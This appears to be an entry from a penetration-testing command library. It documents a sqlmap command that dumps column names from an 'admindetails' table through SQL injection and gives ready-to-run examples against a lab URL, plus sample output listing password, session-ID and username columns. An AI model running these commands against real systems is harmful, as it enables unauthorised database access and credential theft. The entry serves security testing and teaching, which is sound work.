---
id: af0e3e66-5fa6-4bb9-9668-793bc6c1830d
name: sqlmap-dump-columns
type: command
executor: bash
data: sqlmap -u "$_TARGET_URL" -D $_DB_NAME -T $_TABLE_NAME --columns --batch
output: |-
  Database: vulcart
  Table: admindetails
  [3 columns]
  +-----------+--------------+
  | Column    | Type         |
  +-----------+--------------+
  | password  | varchar(50)  |
  | sessionid | varchar(150) |
  | username  | varchar(50)  |
  +-----------+--------------+
created_at: '2020-08-19T18:56:34.610612+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Web
tags:
  - sqli
  - SQLMap
verified: true
validated: true
---

# sqlmap-dump-columns

## Command

```bash
sqlmap -u "$_TARGET_URL" -D $_DB_NAME -T $_TABLE_NAME --columns --batch
```

## Description

This command uses SQLMap to dump column names and types from a specified table in a database via SQL injection. It targets blind injections and logs results for offline review.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u "$_TARGET_URL" | Vulnerable URL (e.g., 'http://192.168.43.68/vcart/search.php?term=') | Yes |
| -D $_DB_NAME | Target database name (e.g., 'vulcart') | Yes |
| -T $_TABLE_NAME | Target table name (e.g., 'admindetails') | Yes |
| --columns | Dump column names and types | Yes |
| --batch | Non-interactive mode | No |

## Examples

### Basic Usage

```bash
sqlmap -u "http://192.168.43.68/vcart/search.php?term=" -D vulcart -T admindetails --columns --batch
```

### Advanced Usage

```bash
sqlmap -u "http://192.168.43.68/vcart/search.php?term=" -D vulcart -T admindetails --columns --batch --time-sec=5
```

## Expected Output

SQLMap banner and results showing columns.

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.7#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: ...
[*] starting at ...
[INFO] the back-end DBMS is MySQL
[INFO] fetching columns for table 'admindetails' in database 'vulcart'
Database: vulcart
Table: admindetails
[3 columns]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| password  | varchar(50)  |
| sessionid | varchar(150) |
| username  | varchar(50)  |
+-----------+--------------+

[INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.43.68'

## Related

- [[procedures/Dump-Database-Column-Names-with-SQLMap]]
- [[tools/sqlmap]]
